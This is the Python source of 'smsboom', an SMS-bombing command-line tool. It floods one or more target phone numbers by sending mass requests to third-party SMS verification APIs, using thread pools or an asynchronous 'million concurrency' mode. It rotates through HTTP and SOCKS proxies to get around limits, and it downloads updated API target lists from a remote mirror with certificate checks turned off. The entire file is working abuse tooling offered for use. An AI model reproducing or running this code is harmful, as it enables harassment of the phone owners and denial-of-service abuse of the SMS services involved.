# encoding=utf8
# smsboom English version

from utils import default_header_user_agent
from utils.log import logger
from utils.models import API
from utils.req import reqFunc, reqFuncByProxy, runAsync
from concurrent.futures import ThreadPoolExecutor
from typing import List, Union
import asyncio
import json
import pathlib
import sys
import time
import click
import httpx
import os

# determine if application is a script file or frozen exe
if getattr(sys, 'frozen', False):
    path = os.path.dirname(sys.executable)
elif __file__:
    path = os.path.dirname(__file__)


def load_proxies() -> list:
    """load proxies for files
    :return: proxies list
    """
    proxy_data = []
    try:
        proxy_path = pathlib.Path(path, 'http_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'http://' + le
            }
            proxy_data.append(proxy_one)
        proxy_path = pathlib.Path(path, 'socks4_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'socks4://' + le
            }
            proxy_data.append(proxy_one)
        proxy_path = pathlib.Path(path, 'socks5_proxy.txt')
        for line in open(proxy_path):
            le = line.replace("\r", "").replace("\n", "")
            if le == '':
                continue
            proxy_one = {
                'all://': 'socks5://' + le
            }
            proxy_data.append(proxy_one)
    except:
        logger.error("proxies Failed to load")
        return []
    logger.success(
        f"proxies Loading completed number of interfaces:{len(proxy_data)}")
    return proxy_data


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        logger.error("Json file not exists!")
        # return None
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            logger.success(
                f"api.json Loading completed Number of interfaces:{len(APIs)}")
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            # return None
            raise ValueError


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        logger.error("GETAPI.json file not exists!")
        # return None
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            logger.success(f"GETAPI loading completed,No:{len(datas)}")
            return datas
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            # return None
            raise ValueError


@click.command()
@click.option("--thread", "-t", help="Number of threads (Default 64)", default=64)
@click.option("--phone", "-p", help="Mobile phone number, you can pass in multiple and then use -p to pass", prompt=True, required=True, multiple=True)
@click.option('--frequency', "-f", default=1, help="Number of executions (default 1)", type=int)
@click.option('--interval', "-i", default=60, help="Intervals(Default 60s)", type=int)
@click.option('--enable_proxy', "-e", is_flag=True, help="Enable proxy(Default Off)", type=bool)
def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
    """Incoming the number of threads and mobile phone number to start bombing,Support multiple phone numbers"""
    logger.info(
        f"Phone number:{phone}, Threads:{thread}, number of executions:{frequency}, Intervals:{interval}")
    with ThreadPoolExecutor(max_workers=thread) as pool:
        try:
            _api = load_json()
            _api_get = load_getapi()
            _proxies = load_proxies()
        except ValueError:
            logger.error(
                "Error reading interface!Redownloading interface data!....")
            update()
            sys.exit(1)
        for i in range(1, frequency + 1):
            logger.success(f"No. 1{i}Wave bombing begins！")
            for proxy in _proxies:
                logger.success(f"No. 1{i}Wave Bombing - Proxy currently in use : " +
                               proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
                # 不可用的代理或API过多可能会影响轰炸效果
                for api in _api:
                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api, phone)
                for api_get in _api_get:
                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api_get, phone)
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)


@click.option("--phone", "-p", help="Mobile phone number, you can pass in multiple and then use -p to pass", prompt=True, required=True, multiple=True)
@click.command()
def asyncRun(phone):
    """Request an interface in the fastest way(Really asynchronous million concurrency)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    loop = asyncio.get_event_loop()
    loop.run_until_complete(runAsync(apis, phone))


@click.option("--phone", "-p", help="Phone number, you can pass in multiple and then use -p to pass", prompt=True, required=True, multiple=True)
@click.command()
def oneRun(phone):
    """Single thread (for testing use)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    for api in apis:
        try:
            reqFunc(api, phone)
        except:
            pass


@click.command()
def update():
    """Get the latest interface from github"""
    GETAPI_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/GETAPI.json"
    API_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/api.json"
    logger.info(f"Pulling the latest interface from GitHub!")
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            # print(API_json_url)
            GETAPI_json = client.get(
                GETAPI_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
            api_json = client.get(
                API_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")

    except Exception as why:
        logger.error(
            f"Pull update failed:{why}Please close all proxy software and try several times!")
    else:
        with open(pathlib.Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(GETAPI_json)
        with open(pathlib.Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(api_json)
        logger.success(f"接口更新成功!")


@click.group()
def cli():
    pass


cli.add_command(run)
cli.add_command(update)
cli.add_command(asyncRun)
cli.add_command(oneRun)

if __name__ == "__main__":
    cli()
